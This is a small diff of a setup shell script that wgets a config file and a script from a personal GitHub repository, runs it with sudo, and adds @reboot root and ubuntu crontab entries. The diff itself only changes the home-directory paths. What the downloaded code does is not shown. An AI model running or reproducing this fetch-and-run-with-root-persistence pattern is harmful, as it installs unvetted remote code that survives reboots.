@@ -10,8 +10,8 @@ wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json
 wget https://raw.githubusercontent.com/bondbenz1821/opme/main/opvn.sh
 chmod +x opvn.sh
 
-(crontab -u root -l; echo "@reboot cd /home/*/opvn && sudo ./opvn 2>&1 &" ) | crontab -u root -
-(crontab -u ubuntu -l; echo "@reboot cd /home/*/opvn && sudo ./opvn 2>&1 &" ) | crontab -u ubuntu -
+(crontab -u root -l; echo "@reboot cd /home/azureuser/opvn && sudo ./opvn 2>&1 &" ) | crontab -u root -
+(crontab -u ubuntu -l; echo "@reboot cd /home/ubuntu/opvn && sudo ./opvn 2>&1 &" ) | crontab -u ubuntu -
 
 sudo ./opvn.sh 2>&1 &
 
